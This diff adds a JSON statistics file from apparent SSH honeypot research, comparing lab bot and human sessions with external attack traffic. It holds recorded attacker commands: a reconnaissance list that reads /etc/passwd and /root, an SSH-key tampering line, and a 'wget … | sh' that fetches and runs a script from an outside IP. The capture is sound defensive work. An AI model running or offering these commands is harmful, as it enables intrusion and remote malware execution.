@@ -1,0 +1,456 @@
+{
+ "lab": {
+  "malformed_lines": 0,
+  "by_class": {
+   "bot": {
+    "sessions": 21,
+    "with_commands": 21,
+    "log_closed": 21,
+    "duplicate_true": 20,
+    "unique_shasums": 1,
+    "tty_file_exists": 21,
+    "sessions_with_derived": 0,
+    "derived_events": 0,
+    "empty_inputs": 0
+   },
+   "human": {
+    "sessions": 31,
+    "with_commands": 31,
+    "log_closed": 31,
+    "duplicate_true": 0,
+    "unique_shasums": 31,
+    "tty_file_exists": 31,
+    "sessions_with_derived": 0,
+    "derived_events": 0,
+    "empty_inputs": 4
+   },
+   "other": {
+    "sessions": 120,
+    "with_commands": 120,
+    "log_closed": 111,
+    "duplicate_true": 74,
+    "unique_shasums": 38,
+    "tty_file_exists": 111,
+    "sessions_with_derived": 0,
+    "derived_events": 0,
+    "empty_inputs": 9
+   }
+  },
+  "derived_examples": [],
+  "bot_commands": [
+   "id",
+   "whoami",
+   "uname -a",
+   "hostname",
+   "cat /etc/passwd",
+   "ps aux",
+   "netstat -an",
+   "ls -la /root",
+   "exit"
+  ],
+  "bot_shasum_counts": [
+   [
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79",
+    21
+   ]
+  ],
+  "bot_sessions_in_order": [
+   [
+    "0a4e00f7e3f7",
+    "bot1",
+    "0",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "153207a3cfff",
+    "bot1",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "18608d39c869",
+    "bot1",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "c6cfb6839ad2",
+    "bot1",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "c73b2b3dbe0b",
+    "bot1",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "340474ea14cc",
+    "bot1",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "d17637ffccd0",
+    "bot2",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "f01259738890",
+    "bot2",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "a9e49614dade",
+    "bot2",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "db65070af843",
+    "bot2",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "f06079988058",
+    "bot2",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "4a4b1f923159",
+    "bot3",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "0a3cad945eaa",
+    "bot3",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "9b5e2228252b",
+    "bot3",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "769f80a2971a",
+    "bot3",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "d88772110ce2",
+    "bot3",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "cf3523ed30a0",
+    "bot4",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "12d54031c0a6",
+    "bot4",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "f0c14590bd68",
+    "bot4",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "ad32c5b4ee08",
+    "bot4",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ],
+   [
+    "042806a46d27",
+    "bot4",
+    "1",
+    "4eef4e7e5bbb5869015833b72e2e437741ea0c1a5d5af043fc60a2a9f9a80c79"
+   ]
+  ]
+ },
+ "external": {
+  "sessions": 216063,
+  "sessions_without_events": 0,
+  "sessions_with_derived": 34166,
+  "derived_events": 90250,
+  "empty_inputs": 1047,
+  "events_hist_old": {
+   "0": 0,
+   "1": 152509,
+   "2": 29630,
+   "3": 214,
+   "4-8": 12812,
+   "9": 5393,
+   ">=10": 15505
+  },
+  "lines_hist_v2": {
+   "0": 230,
+   "1": 171216,
+   "2": 27694,
+   "3": 134,
+   "4-8": 438,
+   "9": 862,
+   ">=10": 15489
+  },
+  "old_primary_by_seq": {
+   "0f07606f9b9db971": {
+    "sessions": 91,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 91,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "2deb137237dfe6b3": {
+    "sessions": 13,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 13
+    }
+   },
+   "40c408712ec9b56a": {
+    "sessions": 794,
+    "lines_v2": {
+     "0": 0,
+     "1": 794,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "52c22fda6ba7d518": {
+    "sessions": 27535,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 27535,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "71dcc2bf892150b3": {
+    "sessions": 2928,
+    "lines_v2": {
+     "0": 0,
+     "1": 2928,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "92735ea50fa4840c": {
+    "sessions": 6,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 0,
+     "4-8": 6,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "949e8dc5e22928ea": {
+    "sessions": 31,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 0,
+     "4-8": 31,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "b76caa5ccf1dbaec": {
+    "sessions": 805,
+    "lines_v2": {
+     "0": 0,
+     "1": 805,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 0
+    }
+   },
+   "e652880c30fb97fc": {
+    "sessions": 830,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 830,
+     ">=10": 0
+    }
+   },
+   "f2beae8e133aff5c": {
+    "sessions": 6,
+    "lines_v2": {
+     "0": 0,
+     "1": 0,
+     "2": 0,
+     "3": 0,
+     "4-8": 0,
+     "9": 0,
+     ">=10": 6
+    }
+   }
+  },
+  "campaign_v2": {
+   "all_ge1": 164046,
+   "ge2": 28512,
+   "ge3": 977,
+   "sequences_ge2": 7
+  },
+  "login_ts_available": 1.0,
+  "first_cmd_latency_median_campaign": 0.5884,
+  "pseudonyms": 8208,
+  "pseudonyms_on_ge2_days": 3239,
+  "login_event_keys": [
+   "arch",
+   "compCS",
+   "data",
+   "destfile",
+   "dst_ip",
+   "dst_port",
+   "duration",
+   "encCS",
+   "eventid",
+   "filename",
+   "fingerprint",
+   "group",
+   "hassh",
+   "hasshAlgorithms",
+   "height",
+   "honeypot_ip",
+   "honeypot_ip_geoip_asn_number",
+   "honeypot_ip_geoip_asn_org",
+   "honeypot_ip_geoip_city_name",
+   "honeypot_ip_geoip_country_iso_code",
+   "honeypot_ip_geoip_country_name",
+   "honeypot_ip_geoip_location",
+   "honeypot_ip_geoip_region_name",
+   "id",
+   "input",
+   "kexAlgs",
+   "key",
+   "keyAlgs",
+   "langCS",
+   "macCS",
+   "message",
+   "name",
+   "outfile",
+   "password",
+   "protocol",
+   "realm",
+   "sensor",
+   "session",
+   "shasum",
+   "size",
+   "src_ip",
+   "src_ip_geoip_asn_number",
+   "src_ip_geoip_asn_org",
+   "src_ip_geoip_city_name",
+   "src_ip_geoip_country_iso_code",
+   "src_ip_geoip_country_name",
+   "src_ip_geoip_location",
+   "src_ip_geoip_region_name",
+   "src_port",
+   "ts",
+   "ts_indexed",
+   "type",
+   "url",
+   "username",
+   "value",
+   "version",
+   "width"
+  ],
+  "asn_key_used": "src_ip_geoip_asn_number",
+  "pseudonyms_with_asn": 8206,
+  "pseudonyms_with_gt1_asn": 84,
+  "campaign_v2_ge2_sequences": [
+   {
+    "seq_hash_v2": "52c22fda6ba7d518",
+    "sessions": 27535,
+    "ips": 4375,
+    "lines": 2,
+    "first_line": "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+   },
+   {
+    "seq_hash_v2": "e652880c30fb97fc",
+    "sessions": 830,
+    "ips": 242,
+    "lines": 9,
+    "first_line": "/ip cloud print"
+   },
+   {
+    "seq_hash_v2": "0f07606f9b9db971",
+    "sessions": 91,
+    "ips": 87,
+    "lines": 3,
+    "first_line": "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+   },
+   {
+    "seq_hash_v2": "949e8dc5e22928ea",
+    "sessions": 31,
+    "ips": 9,
+    "lines": 8,
+    "first_line": "/ip cloud print"
+   },
+   {
+    "seq_hash_v2": "2deb137237dfe6b3",
+    "sessions": 13,
+    "ips": 12,
+    "lines": 11,
+    "first_line": "uname -a"
+   },
+   {
+    "seq_hash_v2": "354786ac9c97585a",
+    "sessions": 6,
+    "ips": 6,
+    "lines": 17,
+    "first_line": "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+   },
+   {
+    "seq_hash_v2": "92735ea50fa4840c",
+    "sessions": 6,
+    "ips": 6,
+    "lines": 6,
+    "first_line": "wget -qO - http://61.215.151.173/x/1sh | sh > /dev/null 2>&1 &"
+   }
+  ]
+ }
+}
